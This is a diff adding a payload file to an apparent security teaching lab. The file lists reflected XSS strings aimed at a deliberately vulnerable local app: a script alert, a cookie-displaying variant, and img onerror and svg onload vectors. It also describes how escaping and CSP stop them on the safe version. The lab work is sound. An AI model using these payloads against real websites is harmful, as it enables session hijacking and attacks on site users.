@@ -1,0 +1,30 @@
+# ===========================================================================
+# Payload: Reflected XSS
+# Target:  VULNERABLE version — http://localhost:5001
+# Route:   GET /search?q=<payload>
+# Effect:  The q parameter is reflected into the page with |safe, so the
+#          browser executes the injected script immediately on page load.
+# ===========================================================================
+
+# --- Basic alert proof-of-concept ---
+http://localhost:5001/search?q=<script>alert('reflected-xss')</script>
+
+# --- Cookie theft variant (simulated — document.cookie shown in alert) ---
+http://localhost:5001/search?q=%3Cscript%3Ealert(%27Cookie%3A%20%27%2Bdocument.cookie)%3C%2Fscript%3E
+
+# --- Image src error handler (bypasses some naive filters) ---
+http://localhost:5001/search?q=<img src=x onerror="alert('reflected-xss-img')">
+
+# --- SVG-based vector ---
+http://localhost:5001/search?q=<svg onload="alert('reflected-xss-svg')">
+
+# ===========================================================================
+# Expected result on VULNERABLE (:5001):
+#   Browser executes alert() on the search results page.
+#
+# Expected result on SAFE (:5002):
+#   The angle brackets are HTML-escaped to &lt;script&gt;... — displayed as
+#   literal text in the page.  No alert fires.
+#   Additionally, the Content-Security-Policy header blocks any inline script
+#   that somehow slips through the escaping.
+# ===========================================================================
